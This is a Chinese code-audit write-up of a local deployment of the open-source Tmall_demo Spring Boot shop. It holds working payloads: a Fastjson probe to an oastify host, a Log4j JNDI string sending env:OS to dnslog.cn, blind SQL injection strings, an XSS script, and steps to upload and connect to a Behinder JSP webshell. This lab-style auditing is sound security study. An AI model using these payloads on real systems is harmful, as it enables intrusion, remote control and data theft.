



# 一、项目简介

> 迷你天猫商城是一个基于Spring Boot的综合性B2C电商平台，需求 设计主要参考天猫商城的购物流程：用户从注册开始，到完成登 录，浏览商品，加入购物车，进行下单，确认收货，评价等一系列 操作。 作为迷你天猫商城的核心组成部分之一，天猫数据管理后台 包含商品管理，订单管理，类别管理，用户管理和交易额统计等模 块，实现了对整个商城的一站式管理和维护。-
> 项目地址： [https://gitee.com/project\_team/Tmall\_demo](https://gitee.com/project_team/Tmall_demo)

# 二、项目搭建

## 环境要求

> 1、Windows 10系统-
> 2、Java版本为1.8.0\_261-
> 3、Mysql版本为5.7-
> 4、IDEA版本随意

## 部署流程

①、创建数据库名为tmalldemodb-
②、将项目文件中的/sqls/tmalldemodb.sql的数据导入到 tmalldemodb数据库，注意导入路径中应使用正斜杠/，如下图所示 ：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187787_635f444b48d63cd90a231.png%21small)-
③、使用IDEA打开本项目，等待Maven自动加载依赖项，如果时间 较长需要自行配置Maven加速源。-
下面几个现象表明项目部署成功。

> pom.xml文件无报错-
> 项目代码已编译为class-
> Run/Debug Configurations...处显示可以运行

④、修改src/main/resouces/application.properties 配置文件内容，具体如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187811_635f4463e6a433ee4a9e0.png%21small)-
⑤、点击启动Run/Debug Configurations...本项目，启动成功 如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187823_635f446f6ce40caf50d41.png%21small)-
⑥、项目访问地址如下：-
前台地址：http://127.0.0.1:8088/tmall-
后台地址：http://127.0.0.1:8088/tmall/admin

# 三、代码审计漏洞验证

## 1、第三方组件漏洞审计

本项目是基于Maven构建的。对于Maven项目，我们首先从 pom.xml文件开始审计引入的第三方组件是否存在漏洞版本，然后进一步验证该组件是否存在漏洞点。

### 什么是pom.xml

> 项目对象模型或POM是Maven的基本工作单元。它是一个XML文 件，其中包含有关Maven用于构建项目的项目和配置详细信息。它包含大多数项目的默认值。示例是构建目录，即target；这是源目 录src/main/java；测试源目录src/test/java；等等。-
> POM已从Maven 1中的project.xml重命名为Maven 2中的 pom.xml。而不是具有包含可执行目标的maven.xml文件，目标 或插件现在已在pom.xml中配置。执行任务或目标时，Maven会在 当前目录中查找POM。它读取POM，获取所需的配置信息，然后执行目标。-
> 可以在POM中指定的一些配置是项目依赖性，可执行的插件或目 标，构建配置文件等。还可以指定其他信息，如项目版本，描述， 开发人员，邮件列表等

本项目引入的组件以及组件版本整理如下

组件名称

组件版本

SpringBoot  2.1.6.RELEASE

Fastjson 1.2.58

Mysql  5.1.47

Druid

1.1.19

Taglibs

1.2.5

Mybatis

3.5.1

Log4j2

2.10.0

整理完成后，如何确定该组件版本存在漏洞？最简单的方法无疑于从搜索引擎进行搜索，比如关键字：Fastjson 漏洞

### 1.1 Fastjson反序列化

#### 白盒审计

本项目引入的Fastjson版本为1.2.58，该版本存在反序列化漏洞。

已确定了Fastjson版本存在问题，进一步寻找触发Fastjson的漏洞点。-
我们\*\*关注两个函数JSON.parse()和JSON.parseObject() ,并且执行函数内参数用户可控 Edit-Find->Find in path \*\*-
全局搜索两个关键字，发现本项目存在JSON.parseObject()，如下图所示：-
在ProductController.java中使用到了上诉关键词-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187853_635f448d75dc9920d1232.png%21small)-
在151、257、281行均调用了JSON.parseObject()方法，则这几处均存在反序列化。

#### 黑盒验证

构造url及参数：-
方法一：通过对各个页面的访问并抓包，找到propertyAddJson参 数-
方法二：通过抓包，观察数据格式构造url 这里我们优先结合方法一，方法二更适合get请求-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187870_635f449e701861a8d63eb.png%21small)-
构造url：通过代码中的admin/product-
http://127.0.0.1:8088/tmall/admin/product-
结合上述访问在网站中快速定位到页面， "添加一件产品"功能处是调用上述product方法-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187950_635f44eeba5332f63110e.png%21small)-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187959_635f44f7e22d2f37afe21.png%21small)-
\*\*不出网漏洞验证 \*\*-
在内网环境中，无法利用互联网的DNSlog进行漏洞验证。我们可以 使用BurpSuite中的Burp Collaborator client功能来进行验 证。-
该功能需使用BurpSuite专业版本。-
①、打开BurpSuite，点击左上角Burp-Burp Collaborator client 进入该功能，如下图所示：-
②、点击Copy to clipboar后，你会获取到一个测试地址，拼凑 成漏洞验证POC： {"@type":"java.net.Inet4Address","val":"nnebxkajwel1tdw8ssiocv9ncei46t.oastify.com"}，然后将其粘贴到 propertyJson字段中，点击发送数据包。稍等一会，多点几次 poll now，可以看到Burp Collaborator client接收到了探测 信息，如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187973_635f4505788bb4c7802d2.png%21small)

至此，Fastjson漏洞验证之旅已结束，通过burp方式，我们证明了该地方存在Fastjson反序列化漏洞。

### 1.2 log4j反序列化

#### 白盒审计

本项目引入的Log4j版本为2.10.0-
2.0<log4j<2.14.1 存在CVE-2021-44228漏洞

由于Apache Log4j2某些功能存在递归解析，攻击者可在未经身份 验证的情况下构造发送带有攻击语句的数据请求包，最终造成在目标服务器上执行任意代码。-
其中涉及到的lookup的主要功能就是提供另外一种方式以添加某些 特殊的值到日志中，以最大化松散耦合地提供可配置属性供使用者 以约定的格式进行调用。-
该组件漏洞主要发生在引入的log4j-core，log4j-api是不存在该问题的。log4j-core是源码，log4j-api是接口。-
pom.xml文件引入Log4j组件情况如下图所示，引入了log4jcore，以及版本为2.10.0。基本确定存在问题，验证还需进一步 寻找能触发的漏洞点。-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187989_635f4515d08c7e4979873.png%21small)-
由于SprinBoot默认自带日志记录框架，一般不需要引入，在 pom.xml中剔除出去。如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667187997_635f451dd8a6d278c1eb2.png%21small)

寻找漏洞触发点

> 一共分为五个级别：**DEBUG、INFO、WARN、ERROR和FATAL**-
> 五个级别是有顺序的\*\*DEBUG < INFO < WARN < ERROR < FATAL \*\*

全局搜索关键字logger，如下图可以看出，本项目使用 logger.info级别记录日志方式居多。-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188009_635f45291e2815cc2eb43.png%21small)-
大多漏洞分析文章使用logger.error去做调试。两者区别在于默 认记录信息不同，这套代码则大部分使用logger.info而两者知识默 认记录的内容不一样，至于出发反序列化都是一样的 经过一番探索，发现有几处日志记录拼接了变量参数，让我们看看 这些参数是否是从前端传来的。如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188031_635f453fef55d685a3641.png%21small)-
双击即可进入该代码文件，该文件位于 src\\main\\java\\com\\xq\\tmall\\controller\\admin\\AccountCon troller.java。该代码文件位于Controller层，主要用于和视图交 互，处理用户输入的数据等操作。-
关键代码如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188049_635f455142b4ac1a1fb0c.png%21small)-
对上述代码进行分析。触发漏洞点的代码为65行的 logger.info("获取图片原始文件名：{}", originalFileName);。 向上追踪，发现通过file.getOriginalFilename();获取file的文 件名后赋值给originalFileName。在向上追踪，file参数来自 admin/uploadAdminHeadImage接口

#### 黑盒验证

下面就是两种方法：-
第一：根据注释提示可以看出来为管理员头像上传功能。-
第二：根据代码拼数据包，用一个上传图片的数据包来改-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188062_635f455eb065357bd159e.png%21small)-
修改filename=“${jndi:ldap://${env:OS}.b0gbfq.dnslog.cn}”-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188094_635f457e136ad5d081f26.png%21small)

### 1.3 Mybatis-sql注入

#### 白盒审计

通过对pom.xml的审计，发现使用Mybatis框架，则对全局${进行 搜索，由于我们关注的是mybatis中的拼接，因此只需要关注 xxxMapper.xml-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188109_635f458dbc95412127fe5.png%21small)-
找到拼接sql语句的id-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188119_635f45974193b57b6a92d.png%21small)-
根据id和返回的Map定位调用该sql语句的接口，也可以在idea 中安装“ Free Mybatis plugin ”插件，通过插件一键定位-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188134_635f45a6da9f55f30f9fe.png%21small)-
依次向上推，找到调用iml接口的dao层方法ctrl+左键-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188147_635f45b36307d0be26f61.png%21small)-
点击getList，它的orderUtil不为空-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188159_635f45bf91568f9b1e3cb.png%21small)-
orderUtil对象相关的是orderBy 和isDesc相关，对这连个参数进行跟踪-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188184_635f45d834be0e5208b1f.png%21small)-
这里orderBy和idDesc都是从request中获得，但是idDesc被限制了 boolean，并且sql语句中orderUtil.orderBy只用到了orderBy-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188200_635f45e81eb4c48455d9e.png%21small)-
因此找到或者拼凑下面url地址及参数-
admin/user/{index}/{count}中的urderBy参数就可验证其为sql注入。

#### 黑盒验证

[http://localhost:8088/tmall/admin/user/1/1](http://localhost:8080/tmall/admin/user/1/1)-
参数：user\_name=&user\_gender\_array=&orderBy=1&isDesc= 随机抓取一个登录后的数据包，然后替换掉url和参数

    GET /tmall/admin/user/1/1?
    user_name=&user_gender_array=&orderBy=1&isDesc=
    HTTP/1.1
    Host: 127.0.0.1:8088
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64;
    x64; rv:98.0) Gecko/20100101 Firefox/98.0
    Accept: */*
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zhHK;q=0.5,en-US;q=0.3,en;q=0.2
    Content-Type: text/html;charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Connection: close
    Referer: http://127.0.0.1:8088/tmall/admin
    Cookie: username=admin; username=admin;
    JSESSIONID=F0CC11F764DE048B217CEC300BEC6C08;
    rememberme=YWRtaW46MTY0OTI0NDI5MjEyODplNTlhM2JmZThmNDI3OTk3N
    zgzYmE5ZTAxMDFmNTkyZQ
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    

发包请求，发现有正常响应-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667188376_635f469898ccde34544fc.png%21small)-
有数据响应，证明请求正常，下面手工验证orderBy是否存在sql注 入，下面给出的几个验证注入点的payload，均证明出了orderBy存 在sql注入点-
①、使用rand函数结果显示排序方式不同

    orderBy=rand(1=1)
    orderBy=rand(1=2)
    

②、利用regexp（正则表达式）

    orderBy=(select+1+regexp+if(1=1,1,0x00)) 正常
    orderBy=(select+1+regexp+if(1=2,1,0x00)) 错误
    

③、利用updatexml（更新选定XML片段的内容）

    orderBy=updatexml(1,if(1=1,1,user()),1) 正确
    orderBy=updatexml(1,if(1=2,1,user()),1) 错误
    

④、利用extractvalue（从目标XML中返回包含所查询值的字符 串）

    orderBy=extractvalue(1,if(1=1,1,user())) 正确
    orderBy=extractvalue(1,if(1=2,1,user())) 错误
    

⑤、时间盲注

    orderBy=if(1=1,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 
    正常响应时间
    orderBy=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) 
    sleep 2秒
    

### 1.4 存储型XSS

#### 代码审计

审计存储型XSS思路有几种：

> 1、根据fortify扫出来的提示，但是这个往往对反射型会比较多，存储型比较少-
> 2、黑盒测试，抓包后根据url，参数定位代码审计（这种更不推荐，因为场景更少，在学习中会经常用到）-
> 3、根据原理审计，存储型xss必定要将xss语句存入数据库，然后在页面刷新存的这个参数时就会被浏览器刷新执行。那存到数据库下手，那存在存储型的大部分是update方法照成的，因为写入如数据无非就是insert和update，insert写入的数据不一定会在前端 jsp有显示，但是update的数据一本都会在页面显示。

\*\*当然以上三种前提是没有对写入参数进行过滤，那这里主要的就是先查看有没有全局过滤器filter或者拦截器（Interceptor） \*\*-
审查pom.xml中是否配置拦截器，经过排查jsp的配置，并未专门针对性的配置filter拦截器审计表filter，发现里面只对登录时会话做了过滤判断，并没有xss的全局过滤器-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189080_635f49586d637b2906a00.png%21small)-
审计表filter，发现里面只对登录时会话做了过滤判断，并没有xss的全局过滤器-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189093_635f4965dd2f1185bb7e9.png%21small)-
按照第三种情况进行排查，sql语句中的update方法，全局搜索-
通过上面的id，及返回类型定位到下面指定方法-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189103_635f496f4a40ee9cdcb3c.png%21small)-
通过dao层定位到实现层代码-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189112_635f49789a407340471f8.png%21small)-
通过实现层一次定位到java层，通过分析最能回显的可能就是admin\_nickname(昵称）-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189124_635f49844f368b89c5c65.png%21small)-
全局搜索admin\_nickname昵称这个单词，到jsp文件中去找，发现 确实存在回显-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189132_635f498c39cdfd7a017bf.png%21small)-
确定有回显，剩下的就是去网站中找修改昵称的功能了。

#### 黑盒验证

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189146_635f499a42c338d5874c1.png%21small)

    插入payload:
    <script>alert(1);</script>
    

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189153_635f49a19ee25bbaca337.png%21small)

### 1.5 任意文件上传

#### 代码审计

在做Log4j漏洞代码审计时，我们发现**管理员头像上传**存在文件上传功能，对于该功能，我们主要审计一下是否存在任意文件上传漏洞。-
一般，对于代码审计任意文件上传漏洞来说，首先是看看是否存在文件上传功能，然后进一步审计是否存在任意文件上传漏洞。-
或者我们可以查看Controller层所有代码，缕清项目大致有哪些功 能点。 或者搜索相关关键字，文件上传关键字如下：

    File
    FileUpload
    FileUploadBase
    FileItemIteratorImpl
    FileItemStreamImpl
    FileUtils
    UploadHandleServlet
    FileLoadServlet
    FileOutputStream
    DiskFileItemFactory
    MultipartRequestEntity
    MultipartFile
    com.oreilly.servlet.MultipartRequest
    

但对于SpingBoot项目来说，想要SpringBoot内嵌的Tomcat对JSP 解析，一定要引入相关依赖。如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189225_635f49e989bef85b1cff7.png%21small)-
这次，我们先关注本项目的**管理员头像上传**文件上传功能，进行代码审计。-
已知本项目引入了对JSP解析的依赖，下面我们审计管理员头像上传 功能的关键代码，看看能否上传JSP木马。代码如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189236_635f49f4bc2d1c27e6df2.png%21small)-
\*\* 代码审计分析：\*\*-
①、第62行，通过@RequestMapping注解，我们得到如下几个信息：

> 1.上传接口为admin/uploadAdminHeadImage（如果找不到前端页 面，可以直接向该接口发送构造好的数据包）-
> 2.上传方法为POST-
> 3.produces = "application/json;charset=UTF-8，定义了返 回格式为JSON 关键信息为接口地址

②、第63行，uploadAdminHeadImage方法接受绑定的file参数 和session参数，我们主要关注file参数。-
③、第64行，获取到文件名称后赋值给originalFileName。-
④、第67行，是获取文件后缀名，先看括号内 originalFileName.lastIndexOf('.')，获取 originalFileName字符串最后一次出现.的地方。然后通过 substring截取子串的方式得到文件后缀名，赋值给变量 extension。也就是说，尽管出现.jsp.jsp.jsp这种形式后缀 名，最后得到的结果也只有.jsp。-
⑤、第69行，随机命名文件，采用UUID+extension方式，并赋值 给fileName参数。-
⑥、第71行，获取上传路径，赋值给filePath。-
⑦、第76到80行，上传文件关键代码，创建文件流将文件上传到 filePath路径中，上传成功后，会返回该文件的文件名。

#### 黑盒验证

在代码审计阶段，我们确定了管理后台中管理员头像上传处存在任 意文件上传漏洞。 我们从渗透测试角度对其进行漏洞验证。 工具涉及到BurpSuite和冰蝎

> 下载地址： https://github.com/rebeyond/Behinder/releases

①、首先，访问后台管理-我的账户功能。并且打开BurpSuite，以及 浏览器代理并指向BurpSuite地址。-
②、点击管理员头像，选择任意图片进行上传。此时BurpSuite抓取 到上传文件数据包，将其发送到Repeater模块，以备后续使用，数 据包如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189252_635f4a0439c9718623020.png%21small)-
③、修改filename后缀名为.jsp，并修改Content-Type: text/plain将原先文件数据内容删除，并将冰蝎 server/shell.jsp木马内容复制粘贴到上传数据包处后，点击发 送数据包，获取到文件名字。如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189268_635f4a1451fe9f4fe63b3.png%21small)-
通过页面中头像地址来拼凑出jsp冰蝎马的地址

> [http://127.0.0.1:8088/tmall/res/images/item/adminProfilePicture/](http://127.0.0.1:8088/tmall/res/images/item/adminProfilePicture/21d4356b-d72f-4336-aafa-404cd4f4396b.jpg)dc5f206c-acd4-4efa-a50f-63fecdd4edeb.jsp

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189280_635f4a202133ebdd7fb1e.png%21small)-
使用冰蝎客户端链接 打开冰蝎，右键新增，将URL地址粘贴进去，并键入密码（默认密 码为：pass）-
⑦、点击保存后，网站列表多了我们新增加的地址，双击该地址， 即可连接JSP木马，如下图所示：-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189291_635f4a2bd2d0e8047a3db.png%21small)

### 1.6 不安全的HTTP请求

#### PUT方法

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189302_635f4a3694342371356c0.png%21small)

## 2、Fortify扫描结果分析

> Fortify是根据其rules进行静态匹配，也就是根据规则进行匹配，因 此这里面有很多误报，在我们代码审计过程中只做参考，不做主要 依据。

### 2.1反射型xss

> ${pageContext.request.contextPath} pageContext为内置函数， 不能改变 ${requestScope.product.product\_id}requestScope类似 request.getParameter,但是这里的product对象是后端传递，前端 并不能修改，因此这里的product\_id不能修改

![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189342_635f4a5eb6acd0ede69f7.png%21small)

### 2.2 keyManagement(key值泄露）

为js中的key，并不是真正的key关键词-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189350_635f4a668f0614a26d6f4.png%21small)

### 2.3 Open Rediect

同反射型xss，参数不可控，不存在url跳转-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189358_635f4a6ee10ef3e3fc275.png%21small)

### 2.4 Password （密码泄露）

不存在，只是匹配到了password-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189366_635f4a76ad69adabd6c4d.png%21small)

### 2.5 sql注入

组件审计中已经审计出，确实存在，但fortify帮助我们把所有存在 直接拼接的地方都扫描出来了-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189376_635f4a80333744605593c.png%21small)

### 2.6 weak Encryption（弱加密）

前端jsp存在AES弱加密-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189385_635f4a89a3ae4e9e2282a.png%21small)

### 2.7 Password Management（密码管理）

数据库密码明文配置-
![image.png](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimage.3001.net%2Fimages%2F20221031%2F1667189394_635f4a925e758e69f663e.png%21small)